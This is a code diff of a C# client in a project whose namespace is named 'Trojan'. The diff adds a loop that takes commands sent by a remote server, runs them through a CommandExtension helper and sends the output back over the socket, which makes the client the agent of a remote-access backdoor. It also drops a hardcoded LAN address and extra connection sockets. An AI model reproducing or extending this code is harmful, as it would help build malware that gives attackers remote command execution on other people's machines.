@@ -1,20 +1,14 @@
 ﻿using System;
 using System.Text;
-using System.Net;
 using System.Net.Sockets;
-using Trojan;
-using Trojan.exceptions;
 using SocketData;
+using Trojan.exceptions;
 
-namespace Trojan.client
+namespace client
 {
     public class Client : SocketHandler
     {
         public socketSetup Connector;
-        public socketSetup Connector2;
-        public socketSetup Connector3;
-        public socketSetup Connector4;
-        public socketSetup Connector5;
 
         public async Task Send_Socket(Socket sock, string message, int SendTimeout)
         {
@@ -38,7 +32,18 @@ namespace Trojan.client
                 {
                     Console.WriteLine("\n[+] [{0}] Received_MessageFromServer[{1}] -- Message_Length[{2} characters] ;", socketSetup.getUUID(), message, message.Length);
                     socketSetup.buffer = tmpBuffer;
-                    await Send_Socket(socketSetup.sock, "Hello server from " + socketSetup.getUUID(), SEND_TIMEOUT);
+
+                    string command_parsed = CommandExtension.CheckForCommand(message);
+                    if (command_parsed != "")
+                    {
+                        string Command_Data = CommandExtension.ExecuteCommand(command_parsed);
+                        await Send_Socket(socketSetup.sock, Command_Data, SEND_TIMEOUT);
+                    }
+                    else if (command_parsed == "" && ReceiveTimeout == Timeout.Infinite)
+                    {
+                        await Send_Socket(socketSetup.sock, "\t[|] Command failed " + "[" + message + "]" + " [" + socketSetup.getUUID() + "]", SEND_TIMEOUT);
+                    }
+
                     if (ReceiveTimeout == Timeout.Infinite) { await Receive_Socket(socketSetup, ReceiveTimeout); }
                 }
                 else
@@ -50,25 +55,23 @@ namespace Trojan.client
 
         public async Task Init_Client(ushort port, uint buffSize)
         {
-            Connector = _SocketOperations.Init_Socket(IPAddress.Parse("192.168.0.35"), new socketSetup(Guid.NewGuid().ToString(), port, buffSize));
-            await _SocketOperations.Connect_Socket(Connector);
-            Task ConnectorReceiver = Task.Factory.StartNew(() => Receive_Socket(Connector, Timeout.Infinite));
+            if (HOST != null)
+            {
+                Connector = _SocketOperations.Init_Socket(HOST, new socketSetup(Guid.NewGuid().ToString(), port, buffSize));
+                await _SocketOperations.Connect_Socket(Connector);
+                Task ConnectorReceiver = Task.Factory.StartNew(() => Receive_Socket(Connector, Timeout.Infinite));
+            }
+        }
 
-            Connector2 = _SocketOperations.Init_Socket(IPAddress.Parse("192.168.0.35"), new socketSetup(Guid.NewGuid().ToString(), port, buffSize));
-            await _SocketOperations.Connect_Socket(Connector2);
-            Task Connector2Receiver = Task.Factory.StartNew(() => Receive_Socket(Connector2, Timeout.Infinite));
+        public static async Task Main()
+        {
+            Client client = new Client();
+            await client.Init_Client(PORT, BUFFSIZE);
 
-            Connector3 = _SocketOperations.Init_Socket(IPAddress.Parse("192.168.0.35"), new socketSetup(Guid.NewGuid().ToString(), port, buffSize));
-            await _SocketOperations.Connect_Socket(Connector3);
-            Task Connector3Receiver = Task.Factory.StartNew(() => Receive_Socket(Connector3, Timeout.Infinite));
+            while (true)
+            {
 
-            Connector4 = _SocketOperations.Init_Socket(IPAddress.Parse("192.168.0.35"), new socketSetup(Guid.NewGuid().ToString(), port, buffSize));
-            await _SocketOperations.Connect_Socket(Connector4);
-            Task Connector4Receiver = Task.Factory.StartNew(() => Receive_Socket(Connector4, Timeout.Infinite));
-
-            Connector5 = _SocketOperations.Init_Socket(IPAddress.Parse("192.168.0.35"), new socketSetup(Guid.NewGuid().ToString(), port, buffSize));
-            await _SocketOperations.Connect_Socket(Connector5);
-            Task Connector5Receiver = Task.Factory.StartNew(() => Receive_Socket(Connector5, Timeout.Infinite));
+            }
         }
     }
 }
